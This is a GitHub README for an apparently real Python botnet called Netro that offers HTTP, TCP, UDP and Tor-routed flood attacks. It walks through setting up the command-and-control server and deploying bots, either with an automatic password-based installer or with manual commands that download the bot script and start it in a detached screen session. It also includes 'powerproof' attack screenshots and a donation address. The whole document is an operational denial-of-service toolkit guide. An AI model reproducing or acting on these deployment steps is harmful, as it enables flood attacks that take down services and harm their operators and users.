# Netro
An EXPERIMENTAL centralized Python botnet that currently supports HTTP, TCP and UDP flood attacks.


## Table Of Contents
- [Requirements](https://github.com/lilmond/Netro?tab=readme-ov-file#requirements)
- [Latest Updates](https://github.com/lilmond/Netro?tab=readme-ov-file#latest-updates)
- [CNC Installation](https://github.com/lilmond/Netro?tab=readme-ov-file#cnc-installation)
  - [Windows 10 Source Code Download](https://github.com/lilmond/Netro?tab=readme-ov-file#for-windows-users)
  - [Linux Source Code Download](https://github.com/lilmond/Netro?tab=readme-ov-file#for-linux-users)
  - [Setting Up Configuration](https://github.com/lilmond/Netro?tab=readme-ov-file#setting-configuration)
  - [Preparing The CNC](https://github.com/lilmond/Netro?tab=readme-ov-file#preparing-cnc)
- [Bot Installation](https://github.com/lilmond/Netro?tab=readme-ov-file#bot-installation)
  - [Automatic Installation](https://github.com/lilmond/Netro?tab=readme-ov-file#automatic-installation)
  - [Manual Installation](https://github.com/lilmond/Netro?tab=readme-ov-file#manual-installation)
- [Discord / Buy Me A Coffee](https://github.com/lilmond/Netro?tab=readme-ov-file#etc)


![image](https://github.com/user-attachments/assets/0995d4df-27ab-428d-b548-a3f17e903ae4)

Some powerproof (1m hrs capped):

![image](https://github.com/user-attachments/assets/4b6cbeee-9dcb-4fd1-ad9e-4b74b4bc62ea)


# Requirements
- 1 VPS for CNC (please prefer a high-end)
- 1 or as many as you want **Ubuntu 24.04** VPS to deploy some bots. Note that they all must have the same password for the [automatic installation method](https://github.com/lilmond/Netro?tab=readme-ov-file#automatic-installation).
- Basic understanding in coding.

# Latest Updates
- Multiple bot instances to use more available resources.
- Added Tor-TCP, Tor-HCF, Tor-POST and Tor-GET method.


# CNC Installation

Please prefer **Ubuntu 24.04** as your bot servers.

Install the source code into your computer (not in the server), you can however, if you know how to use Linux terminal text editors such as **vim** or **nano**. Any is preferable.

### For Windows Users
You may download the source code via the ZIP file.

![image](https://github.com/user-attachments/assets/32c7b125-d1f3-4f23-a8ce-8d09ecaf7674)


### For Linux Users
For Linux users, you may download the source code via terminal using **git** command. You may install **git** into your system and download **Netro**'s source code using the following commands below:
```bash
sudo apt install git -y
git clone https://github.com/lilmond/Netro
cd ./Netro
```

### Setting Configuration

You may now edit **cnc_config.json**. You have two options, either use a text editor GUI such as **VS Code** or via terminal using **vim** or **nano**.

Replace the **IP**'s value to your VPS server's public IP address where you will install your **CNC** on.
```json
{
    "IP": "68.136.174.102",
    "PORT": 4444
}
```

### Preparing CNC
Now, you can upload **netro_cnc.py** and **cnc_config.json** into your VPS.

You can do this using **scp** command. However, if you have **MobaXterm** installed, you may just log into your SSH and drag-and-drop both of the files into **MobaXterm**'s server file manager.

Using scp command:
```bash
scp netro_cnc.py cnc_config.json root@"cnc server ip":
```

Replace the "cnc server ip" into your CNC server's public IP, and remove the double quotes.

You may then log into your VPS and run the CNC script.
```bash
python3 netro_cnc.py
```

Great, now that you have the CNC server, you can jump into deploying the bots.


# Bot Installation
There are two methods to install the bot, either automatically or manually.

## Automatic Installation
In your computer files, open the bot_installer folder or **cd** into it:
```bash
cd ./bot_installer
```

Edit **bot_servers.txt**, write down the IP address of the VPS you're deploying the bot into.

Edit **bot_password.txt**, write down the password of your VPS. Your servers must have the same password if you're doing this on multiple servers.

Run **bot_installer.py**:
````bash
python3 bot_installer.py
````

## Manual Installation
Log into your SSH server and execute the following commands:
```bash
# Edit your CNC IP here
echo '{"IP": "53.63.182.235", "PORT": 4444}' > cnc_config.json

curl https://raw.githubusercontent.com/lilmond/Netro/refs/heads/main/netro_bot.py > netro_bot.py
curl https://raw.githubusercontent.com/lilmond/Netro/refs/heads/main/useragents.txt > useragents.txt
curl https://raw.githubusercontent.com/lilmond/Netro/refs/heads/main/bot_manual_requirements.txt > bot_manual_requirements.txt
sudo apt update -y && sudo apt upgrade -y
sudo apt install tor -y
sudo apt install python3.12-venv -y
python3 -m venv venv
source venv/bin/activate
pip install -r bot_manual_requirements.txt
sudo service tor start
screen -d -m python netro_bot.py
```


# Etc
Discord: https://discord.com/invite/Bnf3e8pkyj

Buy me a coffee via Bitcoin: 17nXfqRRiSGDpx1XEh3veHA6gyCLAktFk9
